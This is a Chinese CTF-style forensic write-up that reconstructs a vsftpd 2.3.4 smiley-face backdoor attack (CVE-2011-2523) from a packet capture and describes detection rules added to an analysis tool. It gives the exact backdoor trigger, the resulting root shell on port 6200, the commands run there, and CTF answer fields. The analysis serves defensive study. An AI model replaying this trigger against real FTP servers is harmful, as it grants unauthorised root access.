# case08：vsftpd 2.3.4 笑脸后门利用链（attack.pcapng）

**类型**：入侵行为分析 + 漏洞利用还原（CVE-2011-2523 笑脸后门）
**样本**：attack.pcapng（132342 包 / 12MB）
**工具化**：`ctfsweep/core/session.py` 新增 ①vsftpd 笑脸后门检测 ②暴露 bash shell 检测

---

## 拓扑与角色

| 角色 | IP | 系统/服务 |
|------|-----|-----------|
| 攻击者 | `192.168.10.106` | 使用 nmap 全端口扫描（固定源端口 60099） |
| 受害者 | `192.168.10.103` | Linux CentOS 6.2（kernel 2.6.32-504.el6.i686） |

## 完整攻击链（按时间序）

```
① 全端口扫描（65535 端口）
   - 特征：.106:60099 → .103:任意端口 [SYN]（固定源端口 = nmap -g 60099 痕迹）
   - 25 万+扫描包即来自这一手法（单流视角会误以为是"60099 服务通信"）

② 服务清单（SYN-ACK 判定开放）
   21 vFTPd 2.3.4(后门版) / 22 OpenSSH 5.3 / 23 Telnet / 80+8080 Apache 2.2.15
   139+445 SMB / 3306 MySQL 5.1.73 / 6200 / 15629 / 37113 / 42838 / 44500 / 54351 / 56436

③ 触发笑脸后门（CVE-2011-2523）
   USER SHHw:)   ← 用户名以 ":)" 结尾即触发
   PASS 9Aa      ← 密码任意
   服务端回 331 Please specify the password（正常响应，后门静默激活）

④ 后门 shell 连接
   #131989 触发 → #132000 6200 端口开始监听（SYN-ACK）→ .106 连 6200 得 root

⑤ 命令执行（6200 root shell）
   id                    → uid=0(root) gid=0(root) groups=0(root)
   nohup  >/dev/null 2>&1
   echo sbVxiDemMsQEqpTH  ← 验证标记字符串
   uname -a              → Linux localhost.localdomain 2.6.32-504.el6.i686 (CentOS 6.2)
   pwd                   → /
   whoami                → root
```

## 额外发现

### 预置后门（在利用之前就存在）
6 个 bash bind shell 全程监听（对探针直接回 `bash: line 1: \r: command not found`）：
`56436 / 42838 / 44500 / 37113 / 54351 / 15629`——**受害者早已被多次入侵**，6200 只是最新一个。

### Web 挑战页（80/8080）
```html
<h1>Flag 不能这样给你 自己去找吧！！！</h1>
<h2>Tips: Robots.txt</h2>
<h3><!--Tips2: 8080 宿舍有个皮卡丘快去抓住他！！！--></h3>
```
指向 Pikachu 靶场式挑战（robots.txt 信息泄露 → 隐藏路径），但**抓包中无人访问 robots.txt / pikachu 路径**，flag 本体不在本抓包内。

## 关键陷阱与经验

1. **固定源端口扫描**：nmap `-g 60099` 让所有扫描流量看起来像"60099 服务"——统计端口时要把
   源端口固定、目的端口遍化、无数据的 SYN 识别为扫描；别被"10860 次 60099 通信"误导。
2. **后门判定要严**：`USER xxx:)` 只有配合 `vsFTPd 2.3.4` banner 才是笑脸后门；
   其他 FTP（如 Microsoft FTP）的 `user:)` 可能是笔误——**误报判别**（本轮同款修正：
   hacker.pcapng 的 `root:)` 已正确放行）。
3. **`command not found` 是 shell 服务指纹**：对 `\r\n` 之类垃圾探针回
   `bash: line 1: ...: command not found` 的端口 = 暴露的 bash shell，直接列为后门端口。
4. **因果链验证**：`USER :))`（#131989）之后 6200 才出现 SYN-ACK（#132000）——
   这类"触发→监听"时序是后门利用的铁证。

## 工具化沉淀（已实现）

`ctfsweep/core/session.py`：
- vsftpd 2.3.4 笑脸后门检测（banner + `:)` 触发，0.95 分）
- 暴露 bash shell 检测（`bash: line`/`command not found` 短流，0.82 分）
- FTP 会话/命令序列 + Linux shell 命令记录（case07 已建）

实测 output：
```
[FTP会话] 192.168.10.106:46309 → 192.168.10.103:21 登录尝试 1 次: SHHw:)/9Aa
  ⚠️ 检测到 vsftpd 2.3.4 笑脸后门（CVE-2011-2523）：USER SHHw:) 触发，后门 shell 监听 6200
[⚠️ shell服务] ×6（15629/37113/42838/44500/54351/56436）
[交互会话] (Linux/命令) 192.168.10.106:43889 → 192.168.10.103:6200（6 条命令）
```

## 同类变体判断指引

- FTP banner 出现 `vsFTPd 2.3.4` → 必定要检查笑脸触发（换 `USER x:)` 重放即可开 6200）
- Metasploitable2 靶机默认就是这套（攻击作业题常见）；6200 端口无协议标识的裸 TCP 会话 = 后门 shell
- 扫描流量识别：固定源端口 + 大量无载荷 SYN；开放端口用 SYN-ACK 反查
- 本题型（问"漏洞/端口/命令/权限"）：答案字段 = vsftpd 2.3.4 / 6200 / id+uname+whoami… / root
